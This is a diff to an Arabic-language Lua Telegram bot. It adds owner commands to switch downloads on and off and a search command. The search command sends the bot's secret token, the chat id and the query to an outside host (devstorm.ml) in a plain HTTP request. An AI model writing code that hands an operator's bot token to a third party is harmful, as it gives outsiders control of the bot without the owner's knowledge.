@@ -1686,6 +1686,22 @@ tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil)
 end  
 end
 --     Source JokerTeam     --
+if text == 'تفعيل التنزيل' and Owner(msg) then   
+database:del(bot_id..'dw:bot:api'..msg.chat_id_) 
+Text = '\n تم تفعيل التنزيلات' 
+send(msg.chat_id_, msg.id_,Text) 
+end
+if text == 'تعطيل التنزيل' and Owner(msg) then  
+database:set(bot_id..'dw:bot:api'..msg.chat_id_,true) 
+Text = '\nتم تعطيل التنزيلات' 
+send(msg.chat_id_, msg.id_,Text) 
+end 
+if text and text:match('^بحث (.*)$') and not database:get(bot_id..'dw:bot:api'..msg.chat_id_) then            
+local Ttext = text:match('^بحث (.*)$') 
+local msgin = msg.id_/2097152/0.5 
+http.request('http://devstorm.ml/tshake/tahaj200.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin)
+end
+--     Source JokerTeam     --
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
 if id:match("-100(%d+)") then
